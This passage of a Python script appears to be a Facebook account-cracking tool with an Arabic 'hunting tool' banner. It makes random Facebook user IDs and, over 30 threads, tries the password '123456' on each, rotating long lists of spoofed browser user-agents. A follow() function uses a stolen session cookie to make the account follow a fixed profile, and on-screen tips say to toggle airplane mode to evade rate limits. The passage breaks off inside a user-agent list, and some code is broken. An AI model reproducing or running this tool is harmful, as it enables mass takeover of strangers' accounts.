    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4445.29 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3761.34 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.4987.74 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.3338.40 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.4811.48 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.4736.94 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.4777.11 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2590.89 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4946.26 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.4865.43 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.3565.70 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.2014.15 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2687.53 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3892.12 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.4988.76 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2975.91 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4986.97 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.2113.66 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2071.67 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.3572.39 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.4534.27 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.3031.27 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.3148.81 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2379.17 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.4802.87 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.4584.56 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2767.79 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3086.92 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.4582.99 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.4625.45 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.2730.51 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.3623.30 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.4067.65 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4378.69 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.2335.35 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3493.43 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.4411.43 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.3805.22 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.3354.93 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2258.60 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4445.97 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2218.66 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.4575.95 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.2250.74 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.2329.97 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.2972.76 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2764.78 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.2084.30 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4185.97 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2504.90 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.3106.79 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4098.23 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.2385.43 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.3384.77 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2164.10 Safari/537.36']
def uaku():
	try:
		ua=open('mix.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/Niki404-Cyber/user-agnet/blob/main/mix.txt').text
		ua=open('.mix.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n') 
		ua=open('.mix.txt','r').read().splitlines()
(id, id2, loop, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni) = ([], [], 0, [], [], [], [], [], [], [], [])
cp = 0
ok = []

try:
    os.mkdir('/sdcard/')
except:
    pass
x = '\x1b[m'
k = '\x1b[1;32m'
h = '\x1b[1;92m'
hh = '\x1b[32m'
u = '\x1b[95m'
K = '\x1b[95m'
kk = '\x1b[33m'
b = '\x1b[1;96m'
p = '\x1b[0;34m'
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'Agustus','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'Agustus','09':'September','10':'October','11':'November','12':'December'}
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'

def clear():
    os.system('clear')


def back():
    login()

ahsan = 'CHA-'
imt = '-M4786=='
ak = 'CHANG-'
myid = uuid.uuid4().hex[:10].upper()

def follow(ses, coki):
    ses.headers.update({'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' })
    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100067945261995', cookies={'cookie': coki }).text, 'html.parser')
    get = r.find('a', string='Follow').get('href')
    ses.get('https://mbasic.facebook.com' + str(get), cookies={'cookie': coki }).text


logo = '''

  \033[2;32m ═══════════════════════════════════════════════════
\033[2;34m

 █████████████████████████████████████████████████████\033[2;32m

\033[1;31m

═══════════════════════════════════════════════════\033[1;34m
║ ✧ أداة صيد   ✧       ║
║ \033[1;31m✧ مبرمج @zizfif✧                    ║
══════════════════════════════════════════════════════

        _   _   _   _     _   _   _   _   _   _
       / \ / \ / \ / \   / \ / \ / \ / \ / \ / \ \
          \x1b[38;5;208m ( V |  I | P ) \033[1;97m( \x1b[1;32mV | \x1b[1;35mI | \x1b[1;96mP | \033[1;97mB | \x1b[1;91m7 | \x1b[1;34mE )
      \033[1;32m \_/ \_/ \_/ \_/   \033[1;32m\_/ \_/ \_/ \_/ \_/ \_/

           \033[1;31m ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
           
           
           ⠀⠀⠀ '''
class tols_B7E_Vip:
    
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system('clear')
        print(logo)
        print('')
        print('\x1b[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        print("\033[1;37m[\033[1;31mXB\033[1;37m] OLD   \033[1;31m-\033[1;33m-\033[1;34m > \033[1;37m[\033[1;31m1\033[1;37m] \033[1;32m  2009 - 2014")                                
        print('\x1b[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        TUTUL = '1'
        if TUTUL in ('1', '01'):
            self.old2()
            exit()
        else:
            
            time.sleep(1)
            Kil_Menu_Vip()

    
    def old(self):
        x = 111111111
        xx = 999999999
        idx = '100000'
        os.system('clear')
        print(logo)
        limit = '5000'
        
        try:
            for n in range(limit):
                _ = random.randint(x, xx)
                __ = idx
                self.id.append(__ + str(_))
            print('\x1b[0;93m [+] TOTAL ID -> \x1b[0;91m%s\x1b[0;97m' % len(self.id))
            with ThreadPoolExecutor(max_workers=30) as coeg:
                listpass = '123456'
                if len(listpass) <= 5:
                    exit('\n%s [!] PASSWORD MINIMUM 6 CHARACTERS' % B)
                print('%s [*] CRACK WITH PASSWORD -> [\x1b[0;91m%s\x1b[0;93m]' % (G, listpass))
                os.system('clear')
                print(logo)
                print('\x1b[95m[H]وانت تنتظر الصيد صلي على محمد وال بيت محمد')
                print('كل 5 دقائق شغل وضع طيران وطفي')
                for user in self.id:
                    coeg.submit(self.api, user, listpass.split(','))
            exit()
        except:
            exit(str(e))


    def api(self, uid, pwx):
        rua = random.choice([
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3636.74 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.4251.77 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4134.61 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.3047.100 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.4192.80 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.2341.82 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.2131.80 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4460.41 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3095.30 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.2800.27 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.2182.64 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.2669.37 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3758.24 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4064.70 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.3073.10 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.3882.84 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2365.36 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.4015.38 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.4412.99 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2171.44 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.2128.11 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.4435.38 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.2029.98 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.4345.27 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2807.13 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4728.99 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.4787.83 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.4646.30 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2367.53 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.3266.49 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4090.13 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.2569.40 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3162.38 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4156.60 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3901.93 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.4443.20 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.2523.44 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.4817.25 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3058.75 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.2805.69 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.4019.56 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.3795.29 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.3381.89 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.4160.76 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.2556.18 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.3716.15 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.2823.25 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.2745.71 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.3945.24 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.2546.67 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3094.19 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.2586.30 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.2692.53 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2817.31 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.4653.97 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4781.97 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.3124.66 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4888.46 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.4352.37 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.2162.88 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.2217.77 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.3953.87 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3423.12 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.3532.41 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.3954.34 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4993.11 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.3858.20 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.4750.47 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3766.79 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.2234.86 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.4233.19 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4400.78 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.4550.62 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2591.52 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.4196.73 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3803.32 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.3521.70 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.3436.61 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4857.40 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.2706.81 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.4806.30 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4702.15 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.4804.48 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4559.35 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4176.78 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3184.34 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.3768.63 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.2002.20 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.2635.23 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.4347.61 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2819.95 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3179.94 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4183.79 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.3760.95 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3336.70 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.2432.21 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2267.68 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.3493.62 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3708.68 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.3306.67 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.2869.63 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.4218.81 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.3700.51 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.2538.90 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.4054.74 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.4386.34 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.4738.52 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.2106.83 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.3159.34 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.3593.91 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.4223.82 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3759.48 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.3353.27 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) 